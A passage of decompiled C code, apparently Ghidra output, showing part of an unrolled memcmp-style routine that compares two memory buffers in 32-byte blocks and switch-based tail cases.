    uVar3 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 2);
    goto LAB_00412a51;
  }
  if (_Size == 4) {
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
                    // WARNING: Load size is inaccurate
    uVar3 = (uint)*_Buf1;
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    uVar3 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    uVar3 = (uint)*(byte *)((int)_Buf1 + 2);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 2);
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    uVar3 = (uint)*(byte *)((int)_Buf1 + 3);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 3);
    goto LAB_00412a51;
  }
  if (0x1f < _Size) {
    do {
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
      if (*_Buf1 == *_Buf2) {
        iVar2 = 0;
      }
      else {
        uVar3 = *_Buf1 & 0xff;
                    // WARNING: Load size is inaccurate
        uVar1 = (uint)*_Buf2;
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 1);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 2);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 2);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 3) - (uint)*(byte *)((int)_Buf2 + 3);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 4) == *(uint *)((int)_Buf2 + 4)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 4) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 4);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 5);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 5);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 6);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 6);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 7) - (uint)*(byte *)((int)_Buf2 + 7);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 8) == *(uint *)((int)_Buf2 + 8)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 8) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 8);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 9);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 9);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 10);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 10);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0xb) - (uint)*(byte *)((int)_Buf2 + 0xb);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 0xc) == *(uint *)((int)_Buf2 + 0xc)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 0xc) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0xc);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0xd);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0xd);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0xe);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0xe);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0xf) - (uint)*(byte *)((int)_Buf2 + 0xf);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 0x10) == *(uint *)((int)_Buf2 + 0x10)) {
        iVar2 = 0;
      }
      else {
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x10);
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x10);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x11);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x11);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x12);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x12);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0x13) - (uint)*(byte *)((int)_Buf2 + 0x13);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 0x14) == *(uint *)((int)_Buf2 + 0x14)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 0x14) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x14);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x15);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x15);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x16);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x16);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0x17) - (uint)*(byte *)((int)_Buf2 + 0x17);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 0x18) == *(uint *)((int)_Buf2 + 0x18)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 0x18) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x18);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x19);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x19);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x1a);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1a);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0x1b) - (uint)*(byte *)((int)_Buf2 + 0x1b);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      if (*(uint *)((int)_Buf1 + 0x1c) == *(uint *)((int)_Buf2 + 0x1c)) {
        iVar2 = 0;
      }
      else {
        uVar3 = *(uint *)((int)_Buf1 + 0x1c) & 0xff;
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1c);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x1d);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1d);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        uVar3 = (uint)*(byte *)((int)_Buf1 + 0x1e);
        uVar1 = (uint)*(byte *)((int)_Buf2 + 0x1e);
        if ((uVar3 != uVar1) &&
           (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
          return iVar2;
        }
        iVar2 = (uint)*(byte *)((int)_Buf1 + 0x1f) - (uint)*(byte *)((int)_Buf2 + 0x1f);
        if (iVar2 != 0) {
          iVar2 = (uint)(0 < iVar2) * 2 + -1;
        }
      }
      if (iVar2 != 0) {
        return iVar2;
      }
      _Size = _Size - 0x20;
      _Buf1 = (void *)((int)_Buf1 + 0x20);
      _Buf2 = (void *)((int)_Buf2 + 0x20);
    } while (0x1f < _Size);
  }
  switch(_Size) {
  default:
    goto switchD_004118f2_caseD_0;
  case 1:
    goto switchD_004118f2_caseD_1;
  case 2:
    goto switchD_004118f2_caseD_2;
  case 3:
    goto switchD_004118f2_caseD_3;
  case 4:
    goto switchD_004118f2_caseD_4;
  case 5:
    goto switchD_004118f2_caseD_5;
  case 6:
    goto switchD_004118f2_caseD_6;
  case 7:
    goto switchD_004118f2_caseD_7;
  case 8:
    goto switchD_004118f2_caseD_8;
  case 9:
    goto switchD_004118f2_caseD_9;
  case 10:
    goto switchD_004118f2_caseD_a;
  case 0xb:
    goto switchD_004118f2_caseD_b;
  case 0xc:
    goto switchD_004118f2_caseD_c;
  case 0xd:
    goto switchD_004118f2_caseD_d;
  case 0xe:
    goto switchD_004118f2_caseD_e;
  case 0xf:
    goto switchD_004118f2_caseD_f;
  case 0x10:
    goto switchD_004118f2_caseD_10;
  case 0x11:
    goto switchD_004118f2_caseD_11;
  case 0x12:
    goto switchD_004118f2_caseD_12;
  case 0x13:
    goto switchD_004118f2_caseD_13;
  case 0x14:
    goto switchD_004118f2_caseD_14;
  case 0x15:
    goto switchD_004118f2_caseD_15;
  case 0x16:
    goto switchD_004118f2_caseD_16;
  case 0x17:
    goto switchD_004118f2_caseD_17;
  case 0x18:
    goto switchD_004118f2_caseD_18;
  case 0x1a:
    goto switchD_004118f2_caseD_1a;
  case 0x1b:
    goto switchD_004118f2_caseD_1b;
  case 0x1c:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1c));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1c))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_18:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x18));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x18))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_14:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x14));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x14))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_10:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x10));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x10))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_c:
    if (*(int *)((int)_Buf1 + (_Size - 0xc)) == *(int *)((int)_Buf2 + (_Size - 0xc))) {
      iVar2 = 0;
    }
    else {
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) - (uint)*(byte *)((int)_Buf2 + (_Size - 9));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_8:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 8));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 8))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) - (uint)*(byte *)((int)_Buf2 + (_Size - 5));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_4:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 4));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 4))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 1)) - (uint)*(byte *)((int)_Buf2 + (_Size - 1));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 == 0) {
switchD_004118f2_caseD_0:
      iVar2 = 0;
    }
    return iVar2;
  case 0x1d:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1d));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1d))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
  case 0x19:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x19));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x19))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_15:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x15));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x15))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_11:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x11));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x11))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
      if (iVar2 != 0) {
